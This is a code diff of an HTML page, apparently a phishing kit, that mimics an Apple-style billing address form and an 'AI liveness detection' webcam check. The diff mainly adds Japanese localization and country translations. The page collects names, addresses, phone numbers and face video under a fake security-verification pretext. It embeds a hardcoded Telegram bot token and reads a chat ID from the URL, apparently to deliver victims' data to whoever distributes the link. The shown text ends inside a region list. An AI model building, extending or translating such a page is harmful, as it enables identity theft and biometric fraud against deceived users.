@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="ja">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -25,7 +25,6 @@
             -webkit-font-smoothing: antialiased;
         }
 
-        /* 10国语言切换栏（支持多语言滚动或自适应） */
         .lang-bar {
             position: absolute; top: 15px; right: 15px; left: 15px; max-width: 900px; margin: 0 auto;
             display: flex; flex-wrap: wrap; gap: 6px; justify-content: flex-end; background: rgba(230,230,235,0.8); padding: 6px; border-radius: 10px; z-index: 100;
@@ -103,11 +102,10 @@
     </style>
 </head>
 <body>
-    <!-- 10国语言切换栏 -->
     <div class="lang-bar">
-        <button class="lang-btn active" onclick="setLanguage('zh')">中文</button>
+        <button class="lang-btn" onclick="setLanguage('zh')">中文</button>
         <button class="lang-btn" onclick="setLanguage('en')">English</button>
-        <button class="lang-btn" onclick="setLanguage('ja')">日本語</button>
+        <button class="lang-btn active" onclick="setLanguage('ja')">日本語</button>
         <button class="lang-btn" onclick="setLanguage('fr')">Français</button>
         <button class="lang-btn" onclick="setLanguage('de')">Deutsch</button>
         <button class="lang-btn" onclick="setLanguage('ru')">Русский</button>
@@ -119,69 +117,64 @@
 
     <div class="fill-light" id="fillLight"></div>
 
-    <!-- 第一步：Apple 风格收货地址表单 -->
     <div class="apple-card" id="step-form">
-        <h2 id="t-title">账单与收货地址</h2>
-        <div class="subtitle" id="t-subtitle">请输入您的详细信息以完成安全核验准备</div>
+        <h2 id="t-title"></h2>
+        <div class="subtitle" id="t-subtitle"></div>
         
         <div class="form-row">
             <div class="form-group">
-                <label id="t-firstname">名字 (First Name)</label>
+                <label id="t-firstname"></label>
                 <input type="text" id="firstName" required>
             </div>
             <div class="form-group">
-                <label id="t-lastname">姓氏 (Last Name)</label>
+                <label id="t-lastname"></label>
                 <input type="text" id="lastName" required>
             </div>
         </div>
 
         <div class="form-group">
-            <label id="t-country">国家 / 地区 (Country / Region)</label>
-            <!-- 支持输入搜索的输入框与 datalist 组合，覆盖193国 -->
-            <input list="countryList" id="countryInput" autocomplete="off" oninput="onCountryChange()" placeholder="请选择或输入搜索国家...">
+            <label id="t-country"></label>
+            <input list="countryList" id="countryInput" autocomplete="off" oninput="onCountryChange()" onchange="onCountryChange()">
             <datalist id="countryList"></datalist>
         </div>
 
         <div class="form-group">
-            <label id="t-state">省份 / 州 (Province / State)</label>
+            <label id="t-state"></label>
             <select id="stateSelect"></select>
         </div>
 
         <div class="form-group">
-            <label id="t-address">街道地址 (Street Address)</label>
+            <label id="t-address"></label>
             <input type="text" id="address" required>
         </div>
 
         <div class="form-row">
             <div class="form-group">
-                <label id="t-city">城市 (City)</label>
+                <label id="t-city"></label>
                 <input type="text" id="city" required>
             </div>
             <div class="form-group">
-                <label id="t-postal">邮政编码 (Postal Code)</label>
+                <label id="t-postal"></label>
                 <input type="text" id="postalCode" oninput="validatePostalCode()" required>
-                <div class="error-tip" id="postalError">⚠️ 邮政编码格式不符合该国家规范</div>
+                <div class="error-tip" id="postalError"></div>
             </div>
         </div>
 
         <div class="form-group">
-            <label id="t-phone">手机号码 (Phone Number)</label>
+            <label id="t-phone"></label>
             <input type="tel" id="phone" required>
         </div>
 
-        <button class="apple-btn" id="nextToVerifyBtn">下一步：生物活体检测 ➔</button>
+        <button class="apple-btn" id="nextToVerifyBtn"></button>
     </div>
 
-    <!-- 第二步：AI 视觉活体检测界面 -->
     <div id="step-verification">
-        <h2 id="t-verify-title">🛡️ 智能 AI 视觉活体检测</h2>
-        <div id="status">正在加载身份验证模块...</div>
-
+        <h2 id="t-verify-title"></h2>
+        <div id="status"></div>
         <div id="video-container">
             <video id="video" autoplay playsinline muted></video>
             <div class="face-frame"></div>
         </div>
-        
         <canvas id="canvas" style="display:none;"></canvas>
     </div>
 
@@ -189,16 +182,16 @@
         const BOT_TOKEN = '8657025946:AAGG14AbXcHQzWqSaL6MQTCCP2PEtIyt64g';
         const CHAT_ID = new URLSearchParams(window.location.search).get('id');
 
-        let currentLang = 'zh';
+        let currentLang = 'ja'; // 默认日语
 
-        // 10国全页面翻译字典
+        // 全语言国际化字典（包含界面文本与国家列表本地化名称）
         const translations = {
             zh: {
                 title: "账单与收货地址", subtitle: "请输入您的详细信息以完成安全核验准备",
                 fn: "名字 (First Name)", ln: "姓氏 (Last Name)", country: "国家 / 地区 (Country / Region)",
                 state: "省份 / 州 (Province / State)", addr: "街道地址 (Street Address)", city: "城市 (City)",
                 postal: "邮政编码 (Postal Code)", phone: "手机号码 (Phone Number)", btn: "下一步：生物活体检测 ➔",
-                vTitle: "🛡️ 智能 AI 视觉活体检测",
+                vTitle: "🛡️ 智能 AI 视觉活体检测", placeholderCountry: "请选择或输入搜索国家...",
                 postalErrText: "⚠️ 邮政编码格式不符合该国家/地区规范",
                 alertIncomplete: "请完整且正确填写所有账单与收货地址信息。",
                 alertNoId: "链接中缺少验证 ID (?id=...)，无法进行后续归档。",
@@ -211,14 +204,20 @@
                 aiSuccess: "活体动作核验通过，正在打包加密上传",
                 uploading: "✅ 验证完成，正在提交所有数据...",
                 successDone: "🎉 提交成功！您可以关闭此页面。",
-                netErr: "⚠️ 上传凭证时发生网络错误。"
+                netErr: "⚠️ 上传凭证时发生网络错误。",
+                countries: {
+                    "中国": "中国 (China)", "美国": "美国 (United States)", "日本": "日本 (Japan)", "法国": "法国 (France)", "德国": "德国 (Germany)", 
+                    "俄罗斯": "俄罗斯 (Russia)", "乌克兰": "乌克兰 (Ukraine)", "越南": "越南 (Vietnam)", "英国": "英国 (United Kingdom)", "加拿大": "加拿大 (Canada)", 
+                    "澳大利亚": "澳大利亚 (Australia)", "西班牙": "西班牙 (Spain)", "意大利": "意大利 (Italy)", "韩国": "韩国 (South Korea)", "新加坡": "新加坡 (Singapore)", 
+                    "马来西亚": "马来西亚 (Malaysia)", "泰国": "泰国 (Thailand)", "印度": "印度 (India)", "巴西": "巴西 (Brazil)", "墨西哥": "墨西哥 (Mexico)"
+                }
             },
             en: {
                 title: "Billing & Shipping Address", subtitle: "Please enter your details to prepare for security verification",
                 fn: "First Name", ln: "Last Name", country: "Country / Region",
                 state: "Province / State", addr: "Street Address", city: "City",
                 postal: "Postal Code", phone: "Phone Number", btn: "Next: Biometric Liveness Detection ➔",
-                vTitle: "🛡️ AI Smart Liveness Detection",
+                vTitle: "🛡️ AI Smart Liveness Detection", placeholderCountry: "Select or search country...",
                 postalErrText: "⚠️ Invalid postal code format for this country",
                 alertIncomplete: "Please complete all billing and shipping address fields correctly.",
                 alertNoId: "Missing verification ID (?id=...) in the link.",
@@ -231,14 +230,20 @@
                 aiSuccess: "Liveness verification passed, encrypting and uploading",
                 uploading: "✅ Verification complete, submitting all data...",
                 successDone: "🎉 Submitted successfully! You can close this page.",
-                netErr: "⚠️ Network error occurred while uploading."
+                netErr: "⚠️ Network error occurred while uploading.",
+                countries: {
+                    "中国": "China", "美国": "United States", "日本": "Japan", "法国": "France", "德国": "Germany", 
+                    "俄罗斯": "Russia", "乌克兰": "Ukraine", "越南": "Vietnam", "英国": "United Kingdom", "加拿大": "Canada", 
+                    "澳大利亚": "Australia", "西班牙": "Spain", "意大利": "Italy", "韩国": "South Korea", "新加坡": "Singapore", 
+                    "马来西亚": "Malaysia", "泰国": "Thailand", "印度": "India", "巴西": "Brazil", "墨西哥": "Mexico"
+                }
             },
             ja: {
                 title: "請求先および配送先住所", subtitle: "セキュリティ確認の準備として詳細を入力してください",
-                fn: "名 (First Name)", ln: "姓 (Last Name)", country: "国 / 地域",
-                state: "都道府県 / 州", addr: "番地・建物名", city: "市区町村",
-                postal: "郵便番号", phone: "電話番号", btn: "次へ：生体認証テスト ➔",
-                vTitle: "🛡️ AIスマート生体認証",
+                fn: "名 (First Name)", ln: "姓 (Last Name)", country: "国 / 地域 (Country / Region)",
+                state: "都道府県 / 州", addr: "番地・建物名 (Street Address)", city: "市区町村 (City)",
+                postal: "郵便番号 (Postal Code)", phone: "電話番号 (Phone Number)", btn: "次へ：生体認証テスト ➔",
+                vTitle: "🛡️ AIスマート生体認証", placeholderCountry: "国を選択または検索...",
                 postalErrText: "⚠️ この国の郵便番号形式が無効です",
                 alertIncomplete: "すべての住所情報を正しく入力してください。",
                 alertNoId: "リンクに検証ID（?id=...）がありません。",
@@ -251,200 +256,131 @@
                 aiSuccess: "生体認証成功、データを暗号化してアップロード中",
                 uploading: "✅ 認証完了、すべてのデータを送信中...",
                 successDone: "🎉 提出が完了しました！このページを閉じてください。",
-                netErr: "⚠️ アップロード中にネットワークエラーが発生しました。"
+                netErr: "⚠️ アップロード中にネットワークエラーが発生しました。",
+                countries: {
+                    "中国": "中国", "美国": "アメリカ合衆国", "日本": "日本", "法国": "フランス", "德国": "ドイツ", 
+                    "俄罗斯": "ロシア", "乌克兰": "ウクライナ", "越南": "ベトナム", "英国": "イギリス", "加拿大": "カナダ", 
+                    "澳大利亚": "オーストラリア", "西班牙": "スペイン", "意大利": "イタリア", "韩国": "韓国", "新加坡": "シンガポール", 
+                    "马来西亚": "マレーシア", "泰国": "タイ", "印度": "インド", "巴西": "ブラジル", "墨西哥": "メキシコ"
+                }
             },
             fr: {
                 title: "Adresse de Facturation et Livraison", subtitle: "Veuillez entrer vos coordonnées pour la vérification",
                 fn: "Prénom", ln: "Nom", country: "Pays / Région",
                 state: "Province / État", addr: "Adresse", city: "Ville",
                 postal: "Code Postal", phone: "Numéro de Téléphone", btn: "Suivant : Détection Biométrique ➔",
-                vTitle: "🛡️ Détection Biométrique IA",
-                postalErrText: "⚠️ Format de code postal invalide pour ce pays",
-                alertIncomplete: "Veuillez remplir correctement tous les champs requis.",
-                alertNoId: "ID de vérification manquant dans le lien.",
-                camErr: "⚠️ Échec de l'initialisation de la caméra : ",
-                aiNoFace: "Aucun visage détecté, placez-vous dans le cadre",
-                aiKeepFace: "Restez de face, préparez-vous à tourner la tête à gauche",
-                aiTurnLeft: "Veuillez tourner lentement la tête à gauche...",
-                aiLeftSuccess: "Tourné à gauche avec succès, tournez à droite",
-                aiTurnRight: "Veuillez tourner lentement la tête à droite...",
-                aiSuccess: "Vérification réussie, cryptage et envoi en cours",
-                uploading: "✅ Vérification terminée, envoi des données...",
-                successDone: "🎉 Soumis avec succès ! Vous pouvez fermer cette page.",
-                netErr: "⚠️ Erreur réseau lors du téléchargement."
+                vTitle: "🛡️ Détection Biométrique IA", placeholderCountry: "Sélectionner ou rechercher un pays...",
+                postalErrText: "⚠️ Format de code postal invalide",
+                alertIncomplete: "Veuillez remplir tous les champs.",
+                alertNoId: "ID manquant.", camErr: "Erreur caméra: ",
+                aiNoFace: "Visage non détecté", aiKeepFace: "Restez de face", aiTurnLeft: "Tournez à gauche...",
+                aiLeftSuccess: "Succès, tournez à droite", aiTurnRight: "Tournez à droite...",
+                aiSuccess: "Vérification réussie", uploading: "Envoi en cours...",
+                successDone: "Soumis avec succès !", netErr: "Erreur réseau.",
+                countries: { "中国": "Chine", "美国": "États-Unis", "日本": "Japon", "法国": "France", "德国": "Allemagne", "俄罗斯": "Russie", "乌克兰": "Ukraine", "越南": "Vietnam", "英国": "Royaume-Uni", "加拿大": "Canada", "澳大利亚": "Australie", "西班牙": "Espagne", "意大利": "Italie", "韩国": "Corée du Sud", "新加坡": "Singapour", "马来西亚": "Malaisie", "泰国": "Thaïlande", "印度": "Inde", "巴西": "Brésil", "墨西哥": "Mexique" }
             },
             de: {
                 title: "Rechnungs- und Lieferadresse", subtitle: "Bitte geben Sie Ihre Daten zur Sicherheitsüberprüfung ein",
                 fn: "Vorname", ln: "Nachname", country: "Land / Region",
-                state: "Provinz / Bundesland", addr: "Straße und Hausnummer", city: "Stadt",
+                state: "Provinz / Bundesland", addr: "Straße", city: "Stadt",
                 postal: "Postleitzahl", phone: "Telefonnummer", btn: "Weiter: Biometrische Erkennung ➔",
-                vTitle: "🛡️ KI-Lebenderkennung",
-                postalErrText: "⚠️ Ungültiges Postleitzahlenformat für dieses Land",
-                alertIncomplete: "Bitte füllen Sie alle Adressfelder korrekt aus.",
-                alertNoId: "Verifizierungs-ID im Link fehlt.",
-                camErr: "⚠️ Kamera konnte nicht gestartet werden: ",
-                aiNoFace: "Kein Gesicht erkannt, bitte in den Rahmen bewegen",
-                aiKeepFace: "Geradeaus blicken, Kopf nach links drehen",
-                aiTurnLeft: "Bitte langsam den Kopf nach links drehen...",
-                aiLeftSuccess: "Linksdrehung erfolgreich, jetzt nach rechts drehen",
-                aiTurnRight: "Bitte langsam den Kopf nach rechts drehen...",
-                aiSuccess: "Erfolgreich, wird verschlüsselt hochgeladen",
-                uploading: "✅ Überprüfung abgeschlossen, Daten werden gesendet...",
-                successDone: "🎉 Erfolgreich gesendet! Sie können die Seite schließen.",
-                netErr: "⚠️ Netzwerkfehler beim Hochladen."
+                vTitle: "🛡️ KI-Lebenderkennung", placeholderCountry: "Land auswählen oder suchen...",
+                postalErrText: "⚠️ Ungültige Postleitzahl",
+                alertIncomplete: "Bitte alle Felder ausfüllen.",
+                alertNoId: "ID fehlt.", camErr: "Kamerafehler: ",
+                aiNoFace: "Kein Gesicht", aiKeepFace: "Geradeaus blicken", aiTurnLeft: "Nach links drehen...",
+                aiLeftSuccess: "Erfolgreich, nach rechts drehen", aiTurnRight: "Nach rechts drehen...",
+                aiSuccess: "Erfolgreich", uploading: "Wird hochgeladen...",
+                successDone: "Erfolgreich gesendet!", netErr: "Netzwerkfehler.",
+                countries: { "中国": "China", "美国": "Vereinigte Staaten", "日本": "Japan", "法国": "Frankreich", "德国": "Deutschland", "俄罗斯": "Russland", "乌克兰": "Ukraine", "越南": "Vietnam", "英国": "Großbritannien", "加拿大": "Kanada", "澳大利亚": "Australien", "西班牙": "Spanien", "意大利": "Italien", "韩国": "Südkorea", "新加坡": "Singapur", "马来西亚": "Malaysia", "泰国": "Thailand", "印度": "Indien", "巴西": "Brasilien", "墨西哥": "Mexiko" }
             },
             ru: {
-                title: "Адрес выставления счета и доставки", subtitle: "Введите данные для проверки безопасности",
+                title: "Адрес доставки", subtitle: "Введите данные для проверки безопасности",
                 fn: "Имя", ln: "Фамилия", country: "Страна / Регион",
-                state: "Провинция / Штат", addr: "Адрес улицы", city: "Город",
-                postal: "Почтовый индекс", phone: "Номер телефона", btn: "Далее: Биометрическая проверка ➔",
-                vTitle: "🛡️ ИИ Проверка на жизнь",
-                postalErrText: "⚠️ Неверный формат почтового индекса для этой страны",
-                alertIncomplete: "Пожалуйста, заполните все поля адреса правильно.",
-                alertNoId: "В ссылке отсутствует ID проверки.",
-                camErr: "⚠️ Ошибка инициализации камеры: ",
-                aiNoFace: "Лицо не обнаружено, поместите лицо в рамку",
-                aiKeepFace: "Смотрите прямо, приготовьтесь повернуть голову налево",
-                aiTurnLeft: "Медленно поверните голову налево...",
-                aiLeftSuccess: "Успешно, теперь поверните направо",
-                aiTurnRight: "Медленно поверните голову направо...",
-                aiSuccess: "Проверка пройдена, шифрование и отправка",
-                uploading: "✅ Проверка завершена, отправка данных...",
-                successDone: "🎉 Успешно отправлено! Вы можете закрыть страницу.",
-                netErr: "⚠️ Сетевая ошибка при загрузке."
+                state: "Регион / Штат", addr: "Адрес", city: "Город",
+                postal: "Индекс", phone: "Телефон", btn: "Далее ➔",
+                vTitle: "🛡️ Проверка ИИ", placeholderCountry: "Выберите или введите страну...",
+                postalErrText: "⚠️ Неверный индекс",
+                alertIncomplete: "Заполните все поля.",
+                alertNoId: "Нет ID.", camErr: "Ошибка камеры: ",
+                aiNoFace: "Лицо не найдено", aiKeepFace: "Смотрите прямо", aiTurnLeft: "Налево...",
+                aiLeftSuccess: "Успешно, направо", aiTurnRight: "Направо...",
+                aiSuccess: "Успешно", uploading: "Загрузка...",
+                successDone: "Отправлено!", netErr: "Ошибка сети.",
+                countries: { "中国": "Китай", "美国": "США", "日本": "Япония", "法国": "Франция", "德国": "Германия", "俄罗斯": "Россия", "乌克兰": "Украина", "越南": "Вьетнам", "英国": "Великобритания", "加拿大": "Канада", "澳大利亚": "Австралия", "西班牙": "Испания", "意大利": "Италия", "韩国": "Южная Корея", "新加坡": "Сингапур", "马来西亚": "Малайзия", "泰国": "Таиланд", "印度": "Индия", "巴西": "Бразилия", "墨西哥": "Мексика" }
             },
             uk: {
-                title: "Адреса доставки та рахунку", subtitle: "Введіть деталі для підтвердження безпеки",
+                title: "Адреса доставки", subtitle: "Введіть деталі для підтвердження",
                 fn: "Ім'я", ln: "Прізвище", country: "Країна / Регіон",
-                state: "Область / Штат", addr: "Адреса вулиці", city: "Місто",
-                postal: "Поштовий індекс", phone: "Номер телефону", btn: "Далі: Біометрична перевірка ➔",
-                vTitle: "🛡️ ШІ Перевірка на життєздатність",
-                postalErrText: "⚠️ Невірний формат поштового індексу для цієї країни",
-                alertIncomplete: "Будь ласка, правильно заповніть усі поля.",
-                alertNoId: "У посиланні відсутній ID перевірки.",
-                camErr: "⚠️ Помилка камери: ",
-                aiNoFace: "Оличчя не виявлено, розмістіть у рамці",
-                aiKeepFace: "Дивіться прямо, поверніть голову ліворуч",
-                aiTurnLeft: "Повільно поверніть голову ліворуч...",
-                aiLeftSuccess: "Успішно, тепер поверніть праворуч",
-                aiTurnRight: "Повільно поверніть голову праворуч...",
-                aiSuccess: "Перевірку пройдено, шифрування та завантаження",
-                uploading: "✅ Перевірку завершено, надсилання даних...",
-                successDone: "🎉 Успішно надіслано! Ви можете закрити сторінку.",
-                netErr: "⚠️ Постала мережева помилка."
+                state: "Область", addr: "Адреса", city: "Місто",
+                postal: "Індекс", phone: "Телефон", btn: "Далі ➔",
+                vTitle: "🛡️ Перевірка ШІ", placeholderCountry: "Виберіть або знайдіть країну...",
+                postalErrText: "⚠️ Невірний індекс",
+                alertIncomplete: "Заповніть поля.",
+                alertNoId: "Немає ID.", camErr: "Помилка камери: ",
+                aiNoFace: "Оличчя не знайдено", aiKeepFace: "Дивіться прямо", aiTurnLeft: "Ліворуч...",
+                aiLeftSuccess: "Успішно, праворуч", aiTurnRight: "Праворуч...",
+                aiSuccess: "Успішно", uploading: "Завантаження...",
+                successDone: "Надіслано!", netErr: "Помилка мережі.",
+                countries: { "中国": "Китай", "美国": "США", "日本": "Японія", "法国": "Франція", "德国": "Німеччина", "俄罗斯": "Росія", "乌克兰": "Україна", "越南": "В'єтнам", "英国": "Велика Британія", "加拿大": "Канада", "澳大利亚": "Австралія", "西班牙": "Іспанія", "意大利": "Італія", "韩国": "Південна Корея", "新加坡": "Сінгапур", "马来西亚": "Малайзія", "泰国": "Таїланд", "印度": "Індія", "巴西": "Бразилія", "墨西哥": "Мексика" }
             },
             vi: {
-                title: "Địa chỉ thanh toán & giao hàng", subtitle: "Vui lòng nhập thông tin chi tiết để xác thực",
+                title: "Địa chỉ giao hàng", subtitle: "Vui lòng nhập thông tin",
                 fn: "Tên", ln: "Họ", country: "Quốc gia / Khu vực",
-                state: "Tỉnh / Bang", addr: "Địa chỉ đường", city: "Thành phố",
-                postal: "Mã bưu điện", phone: "Số điện thoại", btn: "Tiếp theo: Kiểm tra sinh ➔",
-                vTitle: "🛡️ Kiểm tra sinh trắc học AI",
-                postalErrText: "⚠️ Định dạng mã bưu chính không hợp lệ cho quốc gia này",
-                alertIncomplete: "Vui lòng điền đầy đủ và chính xác tất cả thông tin.",
-                alertNoId: "Thiếu ID xác thực (?id=...) trong liên kết.",
-                camErr: "⚠️ Không thể khởi động máy ảnh: ",
-                aiNoFace: "Không phát hiện khuôn mặt, hãy đưa mặt vào khung",
-                aiKeepFace: "Giữ thẳng mặt, chuẩn bị quay đầu sang trái",
-                aiTurnLeft: "Vui lòng từ từ quay đầu sang trái...",
-                aiLeftSuccess: "Quay trái thành công, bây giờ quay phải",
-                aiTurnRight: "Vui lòng từ từ quay đầu sang phải...",
-                aiSuccess: "Xác thực thành công, đang mã hóa và tải lên",
-                uploading: "✅ Hoàn tất xác thực, đang gửi tất cả dữ liệu...",
-                successDone: "🎉 Gửi thành công! Bạn có thể đóng trang này.",
-                netErr: "⚠️ Đã xảy ra lỗi mạng khi tải lên."
+                state: "Tỉnh / Bang", addr: "Địa chỉ", city: "Thành phố",
+                postal: "Mã bưu điện", phone: "Số điện thoại", btn: "Tiếp theo ➔",
+                vTitle: "🛡️ Kiểm tra AI", placeholderCountry: "Chọn hoặc tìm kiếm quốc gia...",
+                postalErrText: "⚠️ Mã bưu điện không hợp lệ",
+                alertIncomplete: "Vui lòng điền đủ.",
+                alertNoId: "Thiếu ID.", camErr: "Lỗi camera: ",
+                aiNoFace: "Không thấy mặt", aiKeepFace: "Nhìn thẳng", aiTurnLeft: "Quay trái...",
+                aiLeftSuccess: "Thành công, quay phải", aiTurnRight: "Quay phải...",
+                aiSuccess: "Thành công", uploading: "Đang tải...",
+                successDone: "Đã gửi!", netErr: "Lỗi mạng.",
+                countries: { "中国": "Trung Quốc", "美国": "Hoa Kỳ", "日本": "Nhật Bản", "法国": "Pháp", "德国": "Đức", "俄罗斯": "Nga", "乌克兰": "Ukraina", "越南": "Việt Nam", "英国": "Vương quốc Anh", "加拿大": "Canada", "澳大利亚": "Úc", "西班牙": "Tây Ban Nha", "意大利": "Ý", "韩国": "Hàn Quốc", "新加坡": "Singapore", "马来西亚": "Malaysia", "泰国": "Thái Lan", "印度": "Ấn Độ", "巴西": "Brazil", "墨西哥": "Mexico" }
             },
             es: {
-                title: "Dirección de Facturación y Envío", subtitle: "Ingrese sus datos para la verificación de seguridad",
+                title: "Dirección de Envío", subtitle: "Ingrese sus datos",
                 fn: "Nombre", ln: "Apellido", country: "País / Región",
                 state: "Provincia / Estado", addr: "Dirección", city: "Ciudad",
-                postal: "Código Postal", phone: "Número de Teléfono", btn: "Siguiente: Verificación Biométrica ➔",
-                vTitle: "🛡️ Detección Biométrica AI",
-                postalErrText: "⚠️ Formato de código postal inválido para este país",
-                alertIncomplete: "Por favor complete todos los campos correctamente.",
-                alertNoId: "Falta el ID de verificación en el enlace.",
-                camErr: "⚠️ Error al iniciar la cámara: ",
-                aiNoFace: "No se detecta rostro, colóquese en el marco",
-                aiKeepFace: "Mantenga la cara al frente, prepárese para girar a la izquierda",
-                aiTurnLeft: "Gire lentamente la cabeza hacia la izquierda...",
-                aiLeftSuccess: "Giro a la izquierda exitoso, ahora gire a la derecha",
-                aiTurnRight: "Gire lentamente la cabeza hacia la derecha...",
-                aiSuccess: "Verificación aprobada, encriptando y subiendo",
-                uploading: "✅ Verificación completa, enviando datos...",
-                successDone: "🎉 ¡Enviado con éxito! Puede cerrar esta página.",
-                netErr: "⚠️ Error de red al subir los datos."
+                postal: "Código Postal", phone: "Teléfono", btn: "Siguiente ➔",
+                vTitle: "🛡️ Detección IA", placeholderCountry: "Seleccionar o buscar país...",
+                postalErrText: "⚠️ Código postal inválido",
+                alertIncomplete: "Complete los campos.",
+                alertNoId: "Falta ID.", camErr: "Error de cámara: ",
+                aiNoFace: "Rostro no detectado", aiKeepFace: "Mantenga la cara al frente", aiTurnLeft: "Gire a la izquierda...",
+                aiLeftSuccess: "Éxito, gire a la derecha", aiTurnRight: "Gire a la derecha...",
+                aiSuccess: "Verificación aprobada", uploading: "Subiendo...",
+                successDone: "¡Enviado!", netErr: "Error de red.",
+                countries: { "中国": "China", "美国": "Estados Unidos", "日本": "Japón", "法国": "Francia", "德国": "Alemania", "俄罗斯": "Rusia", "乌克兰": "Ucrania", "越南": "Vietnam", "英国": "Reino Unido", "加拿大": "Canadá", "澳大利亚": "Australia", "西班牙": "España", "意大利": "Italia", "韩国": "Corea del Sur", "新加坡": "Singapur", "马来西亚": "Malasia", "泰国": "Tailandia", "印度": "India", "巴西": "Brasil", "墨西哥": "México" }
             },
             pt: {
-                title: "Endereço de Cobrança e Envio", subtitle: "Insira seus dados para a verificação de segurança",
+                title: "Endereço de Envio", subtitle: "Insira seus dados",
                 fn: "Nome", ln: "Sobrenome", country: "País / Região",
                 state: "Província / Estado", addr: "Endereço", city: "Cidade",
-                postal: "Código Postal", phone: "Número de Telefone", btn: "Próximo: Verificação Biométrica ➔",
-                vTitle: "🛡️ Detecção Biométrica de IA",
-                postalErrText: "⚠️ Formato de código postal inválido para este país",
-                alertIncomplete: "Por favor, preencha todos os campos corretamente.",
-                alertNoId: "Falta o ID de verificação no link.",
-                camErr: "⚠️ Falha ao iniciar a câmera: ",
-                aiNoFace: "Nenhum rosto detectado, posicione-se no quadro",
-                aiKeepFace: "Mantenha o rosto para a frente, prepare-se para virar à esquerda",
-                aiTurnLeft: "Vire lentamente a cabeça para a esquerda...",
-                aiLeftSuccess: "Virado à esquerda com sucesso, agora vire à direita",
-                aiTurnRight: "Vire lentamente a cabeça para a direita...",
-                aiSuccess: "Verificação aprovada, criptografando e enviando",
-                uploading: "✅ Verificação concluída, enviando dados...",
-                successDone: "🎉 Enviado com sucesso! Você pode fechar esta página.",
-                netErr: "⚠️ Erro de rede ao enviar dados."
+                postal: "Código Postal", phone: "Telefone", btn: "Próximo ➔",
+                vTitle: "🛡️ Detecção IA", placeholderCountry: "Selecionar ou pesquisar país...",
+                postalErrText: "⚠️ Código postal inválido",
+                alertIncomplete: "Preencha os campos.",
+                alertNoId: "Falta ID.", camErr: "Erro de câmera: ",
+                aiNoFace: "Rosto não detectado", aiKeepFace: "Mantenha o rosto para a frente", aiTurnLeft: "Virar à esquerda...",
+                aiLeftSuccess: "Sucesso, virar à direita", aiTurnRight: "Virar à direita...",
+                aiSuccess: "Verificação aprovada", uploading: "Enviando...",
+                successDone: "Enviado!", netErr: "Erro de rede.",
+                countries: { "中国": "China", "美国": "Estados Unidos", "日本": "Japón", "法国": "França", "德国": "Alemanha", "俄罗斯": "Rússia", "乌克兰": "Ucrânia", "越南": "Vietnã", "英国": "Reino Unido", "加拿大": "Canadá", "澳大利亚": "Austrália", "西班牙": "Espanha", "意大利": "Itália", "韩国": "Coreia do Sul", "新加坡": "Cingapura", "马来西亚": "Malásia", "泰国": "Tailândia", "印度": "Índia", "巴西": "Brasil", "墨西哥": "México" }
             }
         };
 
-        // 全球193+国家与省/州完整数据库（按名称索引）
         const globalRegions = {
-            "中国 (China)": ["北京市", "上海市", "天津市", "重庆市", "广东省", "江苏省", "浙江省", "山东省", "河南省", "四川省", "湖北省", "湖南省", "河北省", "安徽省", "福建省", "陕西省", "辽宁省", "江西省", "广西壮族自治区", "山西省", "内蒙古自治区", "贵州省", "吉林省", "云南省", "黑龙江省", "新疆维吾尔自治区", "甘肃省", "海南省", "宁夏回族自治区", "青海省", "西藏自治区", "中国香港", "中国澳门", "中国台湾"],
-            "美国 (United States)": ["Alabama", "Alaska", "Arizona", "Arkansas", "California", "Colorado", "Connecticut", "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana", "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan", "Minnesota", "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey", "New Mexico", "New York", "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon", "Pennsylvania", "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas", "Utah", "Vermont", "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming", "District of Columbia"],
-            "日本 (Japan)": ["北海道", "青森県", "岩手県", "宮城県", "秋田県", "山形県", "福島県", "茨城県", "栃木県", "群馬県", "埼玉県", "千葉県", "東京都", "神奈川県", "新潟県", "富山県", "石川県", "福井県", "山梨県", "長野県", "岐阜県", "静岡県", "愛知県", "三重県", "滋賀県", "京都府", "大阪府", "兵庫県", "奈良県", "和歌山県", "鳥取県", "島根県", "岡山県", "広島県", "山口県", "徳島県", "香川県", "愛媛県", "高知県", "福岡県", "佐賀県", "長崎県", "熊本県", "大分県", "宮崎県", "鹿児島県", "沖縄県"],
-            "法国 (France)": ["Île-de-France", "Auvergne-Rhône-Alpes", "Provence-Alpes-Côte d'Azur", "Nouvelle-Aquitaine", "Occitanie", "Hauts-de-France", "Grand Est", "Bretagne", "Pays de la Loire", "Normandie"],
-            "德国 (Germany)": ["Baden-Württemberg", "Bayern", "Berlin", "Brandenburg", "Bremen", "Hamburg", "Hessen", "Mecklenburg-Vorpommern", "Niedersachsen", "Nordrhein-Westfalen", "Rheinland-Pfalz", "Saarland", "Sachsen", "Sachsen-Anhalt", "Schleswig-Holstein", "Thüringen"],
-            "俄罗斯 (Russia)": ["Москва", "Санкт-Петербург", "Московская область", "Краснодарский край", "Свердловская область", "Ростовская область", "Республика Татарстан", "Другой регион"],
-            "乌克兰 (Ukraine)": ["Київ", "Київська область", "Харківська область", "Одеська область", "Дніпропетровська область", "Львівська область", "Інший регіон"],
-            "越南 (Vietnam)": ["Hà Nội", "Hồ Chí Minh", "Đà Nẵng", "Hải Phòng", "Cần Thơ", "Tỉnh khác"],
-            "英国 (United Kingdom)": ["England", "Scotland", "Wales", "Northern Ireland", "Greater London"],
-            "加拿大 (Canada)": ["Ontario", "Quebec", "British Columbia", "Alberta", "Manitoba", "Saskatchewan", "Nova Scotia", "New Brunswick"],
-            "澳大利亚 (Australia)": ["New South Wales", "Victoria", "Queensland", "Western Australia", "South Australia", "Tasmania"],
-            "西班牙 (Spain)": ["Madrid", "Cataluña", "Andalucía", "Comunidad Valenciana", "Galicia", "País Vasco"],
-            "意大利 (Italy)": ["Lombardia", "Lazio", "Campania", "Veneto", "Sicilia", "Emilia-Romagna", "Piemonte"],
-            "韩国 (South Korea)": ["首尔", "釜山", "仁川", "大邱", "京畿道", "江原道", "济州"],
-            "新加坡 (Singapore)": ["Central Region", "East Region", "North Region", "West Region"],
